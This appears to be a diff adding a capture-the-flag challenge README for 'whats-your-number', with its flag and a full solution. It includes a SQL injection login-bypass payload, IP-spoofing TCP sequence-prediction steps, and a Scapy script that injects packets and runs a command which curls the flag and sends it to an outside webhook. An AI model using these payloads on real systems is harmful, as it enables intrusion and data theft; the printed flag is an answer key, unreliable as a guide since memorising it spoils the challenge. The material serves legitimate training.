@@ -1,0 +1,121 @@
+# whats-your-number - hard
+
+## Description
+
+Anna found this strange website. We do not know much about it but would like to see what we could find. She told me that something strange is happening on the transport layer, can you find out more?
+
+---
+
+This challenge requires the ability to spoof source IP addresses. Some ISPs will block this. To help keep the challenge fair, we've setup a relay. Sending a packet to `whats-your-number-relay.aws.jerseyctf.com` (resolve the IP address) will rewrite the source address to `1.2.3.4` and forward it to `whats-your-number.aws.jerseyctf.com`. Nothing else is changed besides the source and destination IP address.
+
+Please note that being behind a NAT or firewall may still prevent the required packets from going through. If you encounter this, you may need to use a cloud provider or VPN that provides direct access to a public IP address. You may want to practice in your LAN first.
+
+## Secondary Category Tags
+
+* networking
+
+## Connection URL
+
+<http://whats-your-number.aws.jerseyctf.com>
+
+## Knowledge or Tools Needed
+
+* TCP
+* Scapy
+* SQL Injection
+* PHP
+
+## Flag
+
+`jctfv{wh0_n33d5_24nd0m_53qu3nc3_num8325}`
+
+## Credit
+
+[Noah Jacobson](https://noahjacobson.com)
+
+## Solution Steps
+
+1. Load the site. To login, SQL injection is needed. From analyzing the provided code, you can derive what is needed for it.
+    1. Being the password is hashed, create a hash for the password `password`:
+        * `php -r 'echo(password_hash("password", PASSWORD_DEFAULT));'`
+        * `$2y$10$p.ldrVih8Mlgv1jqphZjFuPTXLFjJipgXKPEFW1WUB0M5rMx3QLt.`
+    2. Example SQL payload:
+
+        ```sql
+          ' UNION SELECT 1 AS id, 'admin' as username, '$2y$10$k0skuQFoUC4vfKRYgGbUdeUrC7Fl3ik9WBKRW9uvZb5h7hzhX4Ale' as password;-- 
+        ```
+
+    3. The SQL payload would go in the username field, and `password` for password.
+
+2. Once logged in, there will be an error (`You must be within the internal network to use this function.`), but you now have a session token.
+
+3. The server is vulnerable to a TCP sequence number attack. The description somewhat points to something happening at the transport layer.
+    * An easy way to check is with `sudo nmap -v -A -Pn whats-your-number.aws.jerseyctf.com`, which returns `TCP Sequence Prediction: Difficulty=0 (Trivial joke)`. Although Wireshark can also be used.
+
+4. The user now needs to register an API key, but they need to spoof the source address of `1.2.3.4` (`127.0.0.1` would not go over the internet). Due to the TCP sequence numbers being predictable, this can be done with scapy. A full solve script at this point is available in [solve.py](./challenge/configurationFiles/solve.py). The session key in the HTTP POST request needs to be updated to match yours. The script:
+
+    * Sets up a TCP connection (although responses can't be received). Since the sequence numbers are predictable, the source can be spoofed.
+    * Sends the request to register the API key.
+    * Uses the API key to use the `/api/runCommand.php` to curl the `/api/getFlag.php` from localhost and then send it to a webhook (this address needs to be changed).
+    * `sudo python3 solve.py <ip of relay or challenge> 80 <1.2.3.4 - or actual IP if using relay> <random source port>`
+    * As stated in the challenge description, the provided relay may need to be used. This is likely the case unless the user has a connection without source checking *and* has control over their NAT (residential connection users most likely). If using the relay, un-NATted public IP access may still be necessary depending on how the NAT is implemented. DigitalOcean is one of the providers that supply this.
+
+
+Code:
+#!/usr/bin/env python3`
+
+from scapy.all import *
+import sys
+import logging
+from time import sleep
+logging.getLogger('scapy.runtime').setLevel(logging.ERROR)
+
+def help_text():
+    print('\nUsage:\n python solve.py [target_ip] [target_port] [source_ip] [source_port]\n')
+    sys.exit()
+
+def send_syn(options, seq_ack):
+    ip = IP(dst=options[0], src=options[2])
+    tcp = TCP(dport=options[1], flags='S', seq=seq_ack[0], ack=0, sport=options[3])
+    packet = ip/tcp
+    send(packet)
+    seq_ack[0] += 1
+    seq_ack[1] += 1
+    return seq_ack
+
+def send_rst(options):
+    ip = IP(dst=options[0], src=options[2])
+    tcp = TCP(dport=options[1], flags='R', seq=seq_ack[0], ack=0, sport=options[3])
+    packet = ip/tcp
+    send(packet)
+
+def send_ack(options, seq_ack):
+    ip = IP(dst=options[0], src=options[2])
+    tcp = TCP(dport=options[1], flags='AP', seq=seq_ack[0], ack=seq_ack[1], sport=options[3])
+    packet = ip/tcp
+    http = f'POST /apikeys.php HTTP/1.1\r\nHost: {options[0]}\r\nContent-Length: 36\r\nContent-Type: application/x-www-form-urlencoded\r\nCookie: SESSION=67e507a23b34b\r\n\r\nkey=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
+    packet = ip/tcp/http
+    send(packet)
+    seq_ack[0] += len(packet[Raw])
+    return seq_ack
+
+def send_http_get(options, seq_ack):
+    ip = IP(dst=options[0], src=options[2])
+    tcp = TCP(dport=options[1], flags='AP', seq=seq_ack[0], ack=seq_ack[1], sport=options[3])
+    http = f'GET /api/runCommand.php?apikey=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&command=curl%20https%3A%2F%2Fwebhook.site%2F6df3-a385-4f49-bec6-a06c56dda959%3Fc%3D%24%28curl%20-s%20http%3A%2F%2Flocalhost%2Fapi%2FgetFlag.php%3Fapikey%3Daaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%20%7C%20base64%29%0A HTTP/1.1\r\nHost: {options[0]}\r\n\r\n'
+    packet = ip/tcp/http
+    send(packet)
+    seq_ack[0] += len(packet[Raw])
+    return seq_ack
+
+if __name__ == '__main__':
+    if len(sys.argv) < 5:
+        help_text()
+    options = (sys.argv[1], int(sys.argv[2]), sys.argv[3], int(sys.argv[4]))
+    seq_ack = [1, 1]
+    send_rst(options)
+    seq_ack = send_syn(options, seq_ack)
+    sleep(.2)
+    seq_ack = send_ack(options, seq_ack)
+    seq_ack = send_http_get(options, seq_ack)
+
